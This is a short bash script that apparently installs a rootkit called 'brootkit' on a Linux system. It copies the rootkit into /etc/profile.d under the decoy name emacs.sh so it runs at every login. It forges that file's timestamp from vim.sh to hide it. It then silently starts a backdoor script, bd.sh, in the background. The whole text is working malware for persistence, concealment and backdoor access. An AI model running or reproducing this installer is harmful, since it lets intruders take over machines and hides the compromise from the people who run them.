#!/bin/bash

cp brootkit.sh /etc/profile.d/emacs.sh
touch -r /etc/profile.d/vim.sh /etc/profile.d/emacs.sh

if type nohup;then
	nohup ./bd.sh > /dev/null 2>&1
fi
